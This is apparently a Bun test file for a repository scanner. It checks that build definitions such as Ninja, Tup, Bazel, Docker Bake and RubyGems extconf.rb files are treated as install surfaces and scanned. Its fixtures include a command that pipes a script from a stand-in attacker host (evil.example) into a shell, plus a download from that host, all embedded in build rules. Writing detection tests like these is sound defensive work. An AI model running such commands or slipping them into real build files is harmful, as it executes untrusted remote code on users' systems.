import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a build definition of a recognized build system is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A build
  // definition runs commands at build time, so it is install content.
  for (const path of [
    "Makefile.in",
    "GNUmakefile.in",
    "Makefile.inc",
    "configure.ac",
    "configure.in",
    "m4/ax_check.m4",
    "build.xml",
    "build.ninja",
    "Tupfile",
    "build.sbt",
    "project/plugins.sbt",
    "build.boot",
    "build",
    "BUILD.bazel",
    "WORKSPACE",
    "WORKSPACE.bazel",
    "tools/defs.bzl",
    "wscript_build",
    "docker-bake.hcl",
    "ci/bake.hcl",
  ]) {
    const inspection = inspected(path, `${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("included Ninja and Tup commands are reviewed and invalidate reuse", () => {
  for (const definition of [
    {
      entry: "build.ninja",
      entryText: "include rules.ninja\nbuild artifact: fetch\n",
      included: "rules.ninja",
      safe: "rule fetch\n  command = echo safe\n",
      unsafe: `rule fetch\n  command = ${PAYLOAD}\n`,
    },
    {
      entry: "Tupfile",
      entryText: "include_rules\n: |> !fetch |> artifact\n",
      included: "Tuprules.tup",
      safe: "!fetch = |> echo safe |>\n",
      unsafe: `!fetch = |> ${PAYLOAD} |>\n`,
    },
  ]) {
    const scan = (text: string) =>
      inspectRepository({
        files: [
          {
            path: definition.entry,
            bytes: new TextEncoder().encode(definition.entryText),
          },
          {
            path: definition.included,
            bytes: new TextEncoder().encode(text),
          },
        ],
      });
    const before = scan(definition.safe);
    const after = scan(definition.unsafe);
    expect(after.coverage.installScripts).toEqual({
      state: "complete",
      items: 2,
    });
    expect(after.findings).toContainEqual(
      expect.objectContaining({
        path: definition.included,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(after.downloads).toContain("https://evil.example/install.sh");
    expect(after.inventorySha256).not.toBe(before.inventorySha256);
  }
});

test("changing a build definition changes the reviewed inventory", () => {
  const before = inspected("build.sbt", 'name := "app"\n');
  const after = inspected(
    "build.sbt",
    'name := "app"\nscalaVersion := "3.4.0"\n',
  );
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("Docker Bake's automatic HCL override is scanned and changes the reuse key", () => {
  const scan = (override: string) =>
    inspectRepository({
      files: [
        {
          path: "docker-bake.hcl",
          bytes: new TextEncoder().encode(
            'target "default" { context = "." }\n',
          ),
        },
        {
          path: "docker-bake.override.hcl",
          bytes: new TextEncoder().encode(override),
        },
      ],
    });
  const before = scan('target "default" { dockerfile = "Dockerfile" }\n');
  const after = scan(
    `target "default" {\n  dockerfile-inline = <<EOF\nFROM alpine\nRUN ${PAYLOAD}\nEOF\n}\n`,
  );
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "docker-bake.override.hcl",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("the executable surface stays bounded", () => {
  // Only build definitions are added: unrelated extensionless files keep no
  // surface, so the inventory does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("NOTICE")).toEqual([]);
  expect(inspected("NOTICE", PAYLOAD).findings).toEqual([]);
});

test("a Ruby native-extension build script is an install surface", () => {
  // RubyGems runs extconf.rb as Ruby while installing a gem with a
  // native extension, the same install-time execution setup.py and
  // build.rs already classify for. Its name alone decides, wherever in
  // the tree the extension directory sits.
  for (const path of ["extconf.rb", "ext/demo/extconf.rb"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary build script keeps the same checks the surface carries:
  // a payload in it is an unsafe-execution finding.
  const inspection = inspected("ext/demo/extconf.rb", `${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["ext/demo/extconf.rb:unsafe-execution:high"]);
});

test("an install-time download inside extconf.rb is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the same bytes in extconf.rb recorded no download
  // and left no gap, so a scan could read clean over an install-time
  // fetch RubyGems would have run.
  const inspection = inspected(
    "ext/demo/extconf.rb",
    "require 'mkmf'\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\ncreate_makefile('demo')\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary extconf.rb keeps no finding", () => {
  const inspection = inspected(
    "ext/demo/extconf.rb",
    "require 'mkmf'\ndir_config('demo')\ncreate_makefile('demo')\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
